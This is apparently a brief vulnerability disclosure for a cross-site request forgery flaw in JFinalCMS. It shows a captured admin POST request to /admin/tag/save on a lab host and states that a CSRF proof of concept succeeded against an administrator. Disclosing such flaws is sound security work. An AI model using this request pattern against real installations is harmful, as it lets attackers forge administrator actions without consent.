**BUG_Author:**

hadagaga

**Vendor:**

https://github.com/jwillber/JFinalCMS

**Software:**

https://github.com/jwillber/JFinalCMS

    Let's construct the packet first, we create a tag, and capture the packet.

```http
POST /admin/tag/save HTTP/1.1
Host: 192.168.113.43:8888
Content-Length: 9
Cache-Control: max-age=0
Origin: http://192.168.113.43:8888
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.113.43:8888/admin/tag/add
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=807D599B9C63E998E02431A4EEDB2C7C
Connection: close

name=CSRF
```

​	A POC that constructs a CSRF is used to simulate that the administrator is under a CSRF attack.

![image-20241203193127386](img/image-20241203193127386.png)

​	Successfully implemented CSRF attacks